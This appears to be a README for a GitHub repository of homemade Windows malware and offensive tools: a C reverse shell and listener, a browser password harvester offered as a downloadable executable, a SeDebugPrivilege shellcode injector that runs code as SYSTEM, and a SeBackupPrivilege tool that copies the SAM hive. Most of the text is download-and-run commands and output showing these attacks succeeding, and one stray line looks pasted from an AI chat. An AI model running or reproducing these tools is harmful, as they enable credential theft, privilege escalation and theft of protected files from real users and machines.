## Simple reverse shell (C)
It's a simple reverse shell in C (duh), it uses winsock 2.2 and you have to set your IP and port in the dedicated variables in the code, i tried to document the code well in comments.

## Simple listener (C)
Simple listener made for the previous simple reverse shell, with custom commands you can define in the code\
Set the listening port in the code, compile and enjoy :) 



## [Browser Credential Harvester (Python)](https://github.com/0xUnd3adBeef/DIY-Malware/releases/download/Windows_Executable/GetBrowserPasswords-v1.0.exe)
Python tool that harvests Firefox, Edge, Chrome, Brave, Opera ( | GX ) and Vivaldi to put them in a password protected (this part still doesn't work) zip archive.
```powershell
PS C:\tempdir> Invoke-WebRequest "https://github.com/0xUnd3adBeef/DIY-Malware/releases/download/Windows_Executable/GetBrowserPasswords-v1.0.exe" -o GetBrowserPasswords-v1.0.exe
PS C:\tempdir> .\GetBrowserPasswords-v1.0.exe
PS C:\tempdir> ls


    Répertoire : C:\tempdir


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        07/11/2025     14:43          20319 browser_profiles_20251107_144319.zip
-a----        07/11/2025     14:43        7265288 GetBrowserPasswords-v1.0.exe
```

Unzip the archive, open "Login Data" in sqlite3

```bash
┌──(kali㉿kali)-[~/Cool Stuff]
└─$ sqlite3 Login\ Data
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
breached                logins_edge_extended    stats                 
insecure_credentials    meta                    sync_entities_metadata
logins                  password_notes          sync_model_metadata   
sqlite> SELECT * FROM meta;
SELECT * FROM logins;
SELECT * FROM sqlite_sequence;
SELECT * FROM sync_entities_metadata;
SELECT * FROM sync_model_metadata;
SELECT * FROM insecure_credentials;
SELECT * FROM password_notes;
SELECT * FROM breached;
SELECT * FROM logins_edge_extended;
SELECT * FROM stats;

[URLs, usernames and passwords are going to show here]
```
Here's a short description for your tool:

---

## [Privilege Escalation via SeDebugPrivilege (C)](https://github.com/0xUnd3adBeef/DIY-Tools/blob/main/InjectThreadSeDebug.c)

C tool that enables SeDebugPrivilege, enumerates running processes, and injects shellcode into processes running as SYSTEM (S-1-5-18). The included shellcode executes `cmd.exe /c whoami /all > C:\temp\whoanew.txt` as a proof of concept.

```powershell
PS C:\tools> .\SeDebugInject.exe
Begin
[+] Successfully enabled SeDebugPrivilege on current token
[+] Successfully made a snapshot
[+] Successfully went to first

[!] Failed opening process [System Process]
  -> Error code : 5

[!] Failed opening process smss.exe
  -> Error code : 5

[+] Successfully opened process winlogon.exe 
[+] Successfully Opened ProcessTOken
[+] Successfully got token information
[+] Successfully got token info2 
  -> The SID doesn't match defined SID

[+] Successfully opened process services.exe 
[+] Successfully Opened ProcessTOken
[+] Successfully got token information
[+] Successfully got token info2 
[+] Success while allocating remote memory
[+] Success while writing remote memory
[+] Success while creating remote thread
[~] Attempting to start remote thread . . .
[ +++ ] Remote thread started
```

Check the output file to verify execution:

```powershell
PS C:\> type C:\temp\whoanew.exe

USER INFORMATION
----------------

User Name           SID
=================== =============================================
nt authority\system S-1-5-18
```


---

## [SeBackupPrivilege File Access Tool (C)](https://github.com/0xUnd3adBeef/DIY-Tools/blob/main/SeBackupPrivilege-Abuse.c)

C tool that abuses SeBackupPrivilege to read and copy files that would otherwise be inaccessible, including system-protected files like the SAM hive. The tool enables the privilege and provides basic file operations (`ls`, `cat`, `cp`) that bypass normal ACL checks using `FILE_FLAG_BACKUP_SEMANTICS`. Please note that explicit DENY will block you anyways since denials have priority over broad allows.

```powershell
# List files in a protected directory
PS C:\tools> .\SeBackupAbuse.exe ls C:\Windows\System32\config
[+] Successfully opened token
[+] Successfully enabled SeBackupPrivilege
Listing files in directory C:\Windows\System32\config\*
.
..
SAM
SYSTEM
SECURITY
SOFTWARE
DEFAULT
...

# Read protected files directly
PS C:\tools> .\SeBackupAbuse.exe cat C:\Windows\System32\config\SAM
[+] Successfully opened token
[+] Successfully enabled SeBackupPrivilege
# note that first bytes will be UTF16 BOM then actual data follows

# Copy protected files to current directory
PS C:\tools> .\SeBackupAbuse.exe cp C:\Windows\System32\config\SAM
[+] Successfully opened token
[+] Successfully enabled SeBackupAbuse.exe
[*] Copying C:\Windows\System32\config\SAM -> .\SAM
[+] Source opened successfully
[+] Destination created successfully
[+] Copied 8192 bytes (total: 8192)
[+] Copy complete: 65536 total bytes

# Verify the copy worked
PS C:\tools> dir SAM

    Directory: C:\tools

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        23/02/2026     15:42          65536 SAM
```

### Usage
- `SeBackupAbuse.exe ls <directory>` - List files in a directory (append `\*`)
- `SeBackupAbuse.exe cat <file>` - Display file contents
- `SeBackupAbuse.exe cp <source> [destination]` - Copy file (defaults to current directory)
